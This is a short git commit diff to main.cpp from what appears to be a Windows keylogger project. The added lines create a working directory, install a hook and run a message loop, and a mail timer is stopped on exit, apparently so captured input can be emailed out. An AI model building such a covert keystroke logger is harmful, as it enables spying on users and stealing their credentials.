8608fc2c26d50057ced7d4b002d8f6eef666d00a
Siul Gutierrez [rootCrash] <siul.gomez94@gmail.com>
2019-08-07 18:53:34 -0500

    Call function

--- main.cpp
+++ main.cpp
@@ -13,9 +13,12 @@ using namespace std;
 int main()
 {
     MSG Msg;
+    IO::MkDir(IO::GetOurPath(true));
+    InstallHook();
     while(GetMessage(&Msg, NULL, 0, 0)) {
         TranslateMessage(&Msg);
         DispatchMessage(&Msg);
     }
+    MailTimer.Stop();
     return 0;
 }
